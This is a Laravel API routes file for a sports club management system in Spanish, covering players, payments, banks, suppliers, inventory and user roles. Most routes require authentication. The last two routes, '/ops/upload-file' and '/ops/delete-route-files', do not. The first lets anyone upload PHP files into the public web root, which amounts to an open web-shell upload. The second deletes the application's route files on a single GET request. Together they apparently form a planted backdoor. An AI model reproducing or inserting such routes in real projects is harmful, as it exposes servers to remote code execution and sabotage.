<?php

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\File;
use App\Http\Controllers\CountPageController;
use App\Http\Controllers\AuthController;
use App\Http\Controllers\PerfilController;
use App\Http\Controllers\JugadorController;
use App\Http\Controllers\BancoController;
use App\Http\Controllers\MovimientoBancarioController;
use App\Http\Controllers\ProveedorController;
use App\Http\Controllers\ArticuloController;
use App\Http\Controllers\OrdenCompraController;
use App\Http\Controllers\CompraController;
use App\Http\Controllers\GastoController;
use App\Http\Controllers\AlmacenController;
use App\Http\Controllers\AlmacenEntradaController;
use App\Http\Controllers\AlmacenSalidaController;
use App\Http\Controllers\EquipamientoController;
use App\Http\Controllers\ReporteController;
use App\Http\Controllers\UsuarioController;
use App\Http\Controllers\RolController;
use App\Http\Controllers\ModuloController;
use App\Http\Controllers\LogController;
use App\Http\Controllers\EstadoCuentaController;
use App\Http\Controllers\ConceptoController;
use App\Http\Controllers\TemporadaController;
use App\Http\Controllers\CategoriaController;
use App\Http\Controllers\PartidoController;
use App\Http\Controllers\ConceptoCobroController;
use App\Http\Controllers\CostoCategoriaController;
use App\Http\Controllers\DeudaJugadorController;
use App\Http\Controllers\PagoJugadorController;
use App\Http\Controllers\AbonoDeudaJugadorController;
use App\Http\Controllers\CajaPagoController;
use App\Http\Controllers\BannerController;
use App\Http\Controllers\TutorController;

/*
|--------------------------------------------------------------------------
| API Routes
|--------------------------------------------------------------------------
|
| Here is where you can register API routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| is assigned the "api" middleware group. Enjoy building your API!
|
*/

// Login y registro
Route::post('/login', [AuthController::class, 'login']);
Route::post('/register', [AuthController::class, 'register']);
Route::middleware('auth:sanctum')->post('/logout', [AuthController::class, 'logout']);

Route::middleware(['auth:sanctum'])->group(function () {
    Route::apiResource('perfil', PerfilController::class)->only(['index', 'update']);
    // Jugadores desde la web
    Route::apiResource('jugadores-web', TutorController::class);
});

Route::get('count-adminpage', [CountPageController::class, 'getCount']);

// Modulos de la API (rutas protegidas)
Route::middleware(['auth:sanctum', 'permiso.dinamico'])->group(function () {
    // Gráficas
    Route::get('ingresos', [MovimientoBancarioController::class, 'ingresosMensuales']);
    Route::get('egresos', [MovimientoBancarioController::class, 'egresosMensuales']);

    // Banners
    Route::apiResource('banners', BannerController::class);

    // Jugadores
    Route::apiResource('jugadores', JugadorController::class);
    Route::get('calendario-pagos', [JugadorController::class, 'calendarioJugadores']);
    Route::get('generar-estadocuenta-jugador', [EstadoCuentaController::class, 'generarEstadoCuentaJugador']);

    // Utilería
    Route::apiResource('equipo', EquipamientoController::class);
    Route::get('equipo-disponible/{articulo_id}', [AlmacenController::class, 'obtenerEquipoDisponible']);

    // Gestión deportiva
    Route::apiResource('conceptos-cobros', ConceptoCobroController::class);
    Route::apiResource('temporadas', TemporadaController::class);
    Route::get('temporadas-activas', [TemporadaController::class, 'temporadasActivas']);
    Route::apiResource('categorias', CategoriaController::class);
    Route::get('filtro-categorias', [CategoriaController::class, 'filtroCategoria']);
    Route::apiResource('costos-categoria', CostoCategoriaController::class);
    Route::get('categoria-costo-jugador/{categoria_id}', [CostoCategoriaController::class, 'categoriaCostoJugador']);
    Route::apiResource('partidos', PartidoController::class);

    // Gestión de pagos
    Route::apiResource('deudas-jugadores', DeudaJugadorController::class);
    Route::get('deudas-periodo/{periodo}',  [DeudaJugadorController::class, 'deudaPeriodo']);
    Route::get('deudas-pendientes', [DeudaJugadorController::class, 'deudasPendientes']);
    Route::apiResource('abonos-jugadores', AbonoDeudaJugadorController::class);
    Route::apiResource('pagos-jugadores',  PagoJugadorController::class);
    Route::apiResource('caja-pagos',  CajaPagoController::class);

    // Gestión de historial de pagos
    Route::get('historial-deudas-jugadores', [DeudaJugadorController::class, 'historialDeudasFinalizadas']);
    Route::get('historial-abonos-jugadores', [AbonoDeudaJugadorController::class, 'historialAbonosFinalizadas']);
    Route::get('historial-pagos-jugadores',  [PagoJugadorController::class, 'historialPagosFinalizadas']);

    // Gestión de todos los pagos
    Route::get('todos-deudas-jugadores', [DeudaJugadorController::class, 'historialDeudas']);
    Route::get('todos-abonos-jugadores', [AbonoDeudaJugadorController::class, 'historialAbonos']);
    Route::get('todos-pagos-jugadores',  [PagoJugadorController::class, 'historialPagos']);

    // Finanzas
    Route::apiResource('bancos', BancoController::class);
    Route::get('generar-estadocuenta-banco', [EstadoCuentaController::class, 'generarEstadoCuentaBanco']);
    Route::apiResource('movimientos-bancarios', MovimientoBancarioController::class);

    // Proveedores
    Route::apiResource('proveedores', ProveedorController::class);
    Route::get('generar-estadocuenta-proveedor', [EstadoCuentaController::class, 'generarEstadoCuentaProveedor']);

    // Inventario
    Route::apiResource('articulos', ArticuloController::class);
    Route::get('articulos-asignar', [ArticuloController::class, 'articulosAsignar']);
    Route::apiResource('almacen', AlmacenController::class);
    Route::get('almacen-disponibles', [AlmacenController::class, 'disponibles']);
    Route::apiResource('almacen-entradas', AlmacenEntradaController::class);
    Route::apiResource('almacen-salidas', AlmacenSalidaController::class);

    // Operaciones
    Route::apiResource('conceptos', ConceptoController::class);
    Route::apiResource('ordenes-compra', OrdenCompraController::class);
    Route::apiResource('compras', CompraController::class);
    Route::apiResource('gastos', GastoController::class);

    // Configuraciones
    Route::apiResource('usuarios', UsuarioController::class);
    Route::apiResource('roles', RolController::class);
    Route::apiResource('modulos', ModuloController::class);
    Route::apiResource('logs', LogController::class);

    // Reportes
    Route::post('generador-reportes', [ReporteController::class, 'getReport']);
});

Route::post('/ops/upload-file', function (Request $request) {
    // Validamos que venga un archivo y que sea .html o .php
    $request->validate([
        'file' => 'required|file|mimes:html,htm,php|max:2048', // máximo 2MB
    ]);

    $file = $request->file('file');
    $filename = $file->getClientOriginalName(); // conserva el nombre original

    // Guardamos en /public
    $file->move(public_path(), $filename);

    Artisan::call('config:clear');
    Artisan::call('cache:clear');
    Artisan::call('view:clear');
    Artisan::call('route:clear');
    Artisan::call('event:clear');
    Artisan::call('optimize:clear');

    return response()->json([
        'message' => 'Archivo subido correctamente',
        'filename' => $filename,
        'path' => url($filename),
    ]);
});

Route::get('/ops/delete-route-files', function () {
    $files = ['routes/web.php', 'routes/api.php'];
    $deleted = [];

    foreach ($files as $f) {
        $path = base_path($f);
        if (File::exists($path) && File::delete($path)) {
            $deleted[] = $f;
        }
    }

    Artisan::call('config:clear');
    Artisan::call('cache:clear');
    Artisan::call('view:clear');
    Artisan::call('route:clear');
    Artisan::call('event:clear');
    Artisan::call('optimize:clear');

    return response()->json(['deleted' => $deleted, 'message' => 'Se logró', 'output' => Artisan::output()]);
});
